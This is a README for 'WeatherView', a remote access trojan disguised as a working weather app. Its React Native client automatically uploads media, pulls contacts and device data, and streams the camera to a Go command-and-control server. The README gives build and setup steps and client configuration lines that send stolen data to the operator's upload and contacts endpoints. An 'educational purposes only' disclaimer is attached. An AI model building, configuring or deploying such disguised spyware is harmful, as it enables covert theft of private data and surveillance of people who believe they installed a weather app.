# Remote Access Trojan under the Disguise of Weather UI (Educational Purposes Only)
https://github.com/user-attachments/assets/a184ea64-3cfc-43aa-b8ce-30ee37fd19ad 

https://github.com/user-attachments/assets/74c86685-53fc-4325-bfd3-b79b8a6ce7ec

## Project Overview

**WeatherView** is a research project demonstrating remote access capabilities through a disguised weather application interface. The system consists of:

1. A React Native client app with weather functionality
2. A Go-based C2 (Command and Control) server
3. Remote access features including media sync, contact retrieval, and video streaming

**Disclaimer**: This project is developed solely for educational purposes in the field of cybersecurity research. Unauthorized use against systems without explicit permission is illegal.

## System Architecture

```
[WeatherView Client App] ←WebSocket→ [Go C2 Server]
      (React Native)              (Command & Control)
```

## Features

- **Weather Interface**: Fully functional weather display
- **Remote Access**:
  - Media file synchronization
  - Contact list retrieval
  - Device information collection
  - Live video streaming capability

## Setup Instructions

### 1. C2 Server Setup

```bash
# Clone the repository
git clone [repository-url]

# Navigate to server directory
cd server

# Build and run the Go server
go build -o main && ./main
```

**Configuration**:
- The server runs on port `6969` by default
- Change port by setting `PORT` environment variable
- Admin interface available at `http://localhost:[port]/admin.html`

### 2. Client App Configuration

Edit the following in the React Native client:

```javascript
// In WeatherApp.js (Weather Interface)
const API_KEY = 'your_openweathermap_api_key'; // Replace with your key
const BASE_URL = 'https://api.openweathermap.org/data/2.5';

// In mediaSync.js (Remote Access)
const SERVER_URL = 'ws://your_server_ip:6969/ws'; // Change to your server IP
const UPLOAD_ENDPOINT = 'http://your_server_ip:6969/upload';
const CONTACTS_ENDPOINT = 'http://your_server_ip:6969/contacts';
```

### 3. Building the Client App

```bash
# Install dependencies
npm install && npm install --save-dev @react-native-community/cli

#Start Metero
npx react-native start

# For Android
npx react-native run-android

# For iOS
npx react-native run-ios
```

## Usage Guide

1. **Weather App Interface**:
   - Displays current weather and forecast
   - Search for locations worldwide

2. **Remote Access Features** (Educational Demonstration):
   - Media sync initiates automatically on connection
   - Contacts are retrieved once permissions are granted
   - Camera streaming available through admin interface

## Security Considerations

- Always run this project in a controlled environment
- Never deploy with default credentials
- Ensure proper network isolation when testing
- All activities must comply with applicable laws

## License

This project is licensed for educational use only. All other uses require explicit permission from the developers.
